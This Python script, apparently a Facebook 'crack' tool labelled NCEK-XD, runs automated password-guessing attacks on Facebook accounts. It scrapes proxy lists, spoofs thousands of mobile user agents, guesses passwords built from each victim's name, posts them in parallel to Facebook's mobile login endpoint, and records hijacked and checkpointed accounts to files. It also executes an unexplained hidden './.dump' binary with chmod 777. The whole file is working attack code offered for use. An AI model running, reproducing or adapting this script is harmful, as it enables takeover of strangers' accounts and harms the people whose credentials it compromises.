### SIMPLE NGAKAK ###
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as ncek_kasep
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all').text
    open('.proxy.txt','w').write(prox) 
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Mi 9T Pro Build/RKQ1.200826.002; rv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/1.4.0 Chrome/108.0.5359.128'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
for apa in range(10000):
	rr = random.randint; rc = random.choice
	card = 'Smatfren'
	Name = 'Ssd'
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	cih = str(rc([f"Mozilla/5.0 (Linux; U; Android 12 {str(rr(3,11))}; M2010J19SG Build/SKQ1.211202.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,100))}.108.0.5359.128.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 OPR/7.2.2254.146534"])) 
	ngentid = random.choice([cih])
	ugen.append(ngentid)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
try:
	try:os.remove('.proxy.txt')
	except:pass
	uadev = ses.get("https://raw.githubusercontent.com/Aryan-mfc/MAX/main/Proxy2/Proxy2.txt").text
	if 'todmek' in uadev:pass
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f" tidak ada koneksi internet")

try:redmi = open('bbnew.txt','r').read().splitlines()
except:redmi = ["Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
try:abcd = open('proxy.txt','r').read().splitlines()
except:sys.exit(f" Helo Proxy Gagal Di Cek soory")
print('')
os.system('sleep 3')
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss=[]
pwnya=[]
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
P = '\x1b[1;97m'
B = '\x1b[1;94m' # BIRU
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
wat = f"{P}{B}[{P}Simpel{B}]{P}"	
def clear():
	os.system('clear')
def back():
	login()
def logo():
	clear()
	print(f"""
          ⠀⠀{B}⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣄⡀⠀⠀⠀
    ⠀ ⠀{P}𝚌𝚛𝚊𝚌𝚔{B}⠀ ⠀⠀⠀⠀⠐⠀⣰⣿⣿⣿⣿⣿⡇⠀⠀⠀
        ⠀⠀ ⠀⠀{B}⠀⠀⠀⠀⠀⢠⣿⣿⣿⠏⠉⠉⠁⠀⠀⠀
         ⠀⠀⠀{B}⠀⠀⠀⠀ ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
         ⠀⠀⠀{B}⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
         ⠀⠀⠀{B}⠀⠀⠀⠿⠿⢿⣿⣿⣿⠿⠿⠿⠇⠀⠀⠀
          ⠀⠀⠀{B}⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀ ⠀{B}⠀ ⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀  {B}⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀ ⠀ {B}  ⠀⠀   ⠀⠀⢸⣿⣿⣿   {P}acebook Tools {M}[ NCEK - XD ]{P}\n   				Version 0.2⠀⠀⠀⠀⠀⠀⠀
 """)
def login():
	logo()
	try:
		print('[01] Langsung crack\n[02] Dump id')
		ris=input('Pilahanmu : ')
		if ris in ["1","01"]:
			xnfile()
		elif ris in ["2","02"]:
			try:
				os.system('chmod 777 .dump && ./.dump')
			except:exit('[Device tidak support] Silahkan dump id terlebih dahulu menggunakan sc lain')
	except:login()
	xnfile()
def xnfile():
	logo()
	en = input('[ENTER]')
	print(' ---------------------------------------------')
	try:_ncek = os.listdir()
	except FileNotFoundError:
		print(' Helo Word Harap Buat File Terlebih Dahulu Nama Kan File itu dump dan isi dalam nya pake file dump kamu jika tidak tau silakan chet wahtsap admin terimakasih><')
		time.sleep(2)
		back()
	if len(_ncek)==0:
		print('Maaf Sebelumnya Buat File Dump Id mu Terlebih Dahulu ')
		time.sleep(2)
		back()
	else:
		_meledak_ = 0
		_doar_ = {}
		for isi in _ncek:
			try:hem = open(isi,'r').readlines()
			except:continue
			_meledak_+=1
			if _meledak_<100:
				nom = ''+str(_meledak_)
				_doar_.update({str(_meledak_):str(isi)})
				_doar_.update({nom:str(isi)})
				print(f'[{nom}]> {H}{isi} {K}={H} {len(hem)}{P}')
			else:
				_doar_.update({str(cih):str(isi)})
		geeh = input(f'\n{wat} Select File : ')
		print('')
		try:geh = _doar_[geeh]
		except KeyError:
			time.sleep(3)
			back()
		try:lin = open(geh,'r').read().splitlines()
		except:
			print('File Tidak Ada Maad')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		_atur_method_()

def _atur_method_():
	print('')
	os.system('clear')
	logo()
	print(' ---------------------------------------------')
	hu = input(f'{wat} Old/O New/N : ')
	if hu in ['o','O']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['n','N']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	else:
		print('')
	hc = input(f'{wat} [ENTER AE OM]:')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(f'{wat} Do you want to add a password? (y)/(t) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{wat} Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
def passwrd():
	os.system('clear')
	logo()
	print(' ---------------------------------------------')
	print(f' OK = OK.txt')
	print(f' CP = CP.txt')
	print(f' TOTAL ID : {len(id)}')
	print(' ---------------------------------------------')
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		print('')

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white] {P}[{H}crack{P}] [{(loop)}]{P}[{H}OK:{ok}{P}]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	prx=random.choice(prox)
	xxx={"http": f"socks4://{prx}"}
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'touch.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://touch.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://touch.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'touch.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{P}[CP] {M}{idf} | {pw}')
				open('CP.txt','a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'{P}[OK] {H}{idf} | {pw}')
				open('OK.txt','a').write(idf+'|'+pw+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('ID')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:
		nc=ses.get('https://pastebin.com/raw/A4Q4HWh8').text
		if "haris" in nc:
			login()
	except:exit()
	